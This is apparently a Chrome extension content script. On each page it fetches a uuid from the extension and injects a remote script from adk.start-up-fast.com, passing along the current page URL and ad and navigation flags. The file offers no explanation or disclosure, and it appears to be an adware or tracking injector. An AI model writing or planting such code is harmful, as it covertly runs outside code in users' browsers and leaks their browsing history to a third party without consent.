!(function() {	
	var defualt_config= {
		scriptSrc:'http://adk.start-up-fast.com/package/js/adk.main.js',
        source:'10000',
        version:'1.0.0',
        uuid:'b721c286802249a4845d73b14c72a4aa',
		is_adv :0,
		is_nav:0,
		is_sl :0
	};

	var S= {
		init: function(data){
			var s, head;
			s = document.createElement("script");
			s.id = "adkmain";
			s.type = "text/javascript";
			s.charset = "utf-8";
			
			var date = new Date();
			var v = date.getFullYear() + "" + (date.getMonth() + 1) + "" + date.getDate();
			
            s.src = data.scriptSrc + "?source=" + data.source + "&version=" 
            + data.version + "&uuid=" + data.uuid 
            + "&v=" + v + "&url=" + encodeURIComponent(location.href)
            + "&is_sl="+data.is_sl+ "&is_nav="+data.is_nav+ "&is_adv="+data.is_adv;
            
			head = document.getElementsByTagName('head')[0];
			head.appendChild(s);
		}
	};

    chrome.extension.sendMessage({method:'get'},function(response){
	    if(response){
            defualt_config.uuid  = response.uuid;
            S.init(defualt_config);
	    }
	});
})();
